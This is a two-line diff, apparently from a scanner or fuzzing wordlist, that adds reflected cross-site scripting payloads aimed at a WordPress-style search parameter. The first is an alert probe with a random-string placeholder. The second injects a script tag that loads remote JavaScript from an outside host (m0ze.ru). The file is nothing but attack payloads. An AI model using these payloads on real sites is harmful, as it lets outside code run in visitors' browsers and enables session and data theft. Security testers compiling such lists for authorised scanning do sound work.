@@ -1,0 +1,2 @@
+/?post_type=post&s=%22%3E%3Cscript%3Ealert(/{{randstr}}/)%3C/script%3E
+/?post_type=post&s=%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fm0ze.ru%2Fpayload%2Fa2r.js%3E%3C%2Fscript%3E
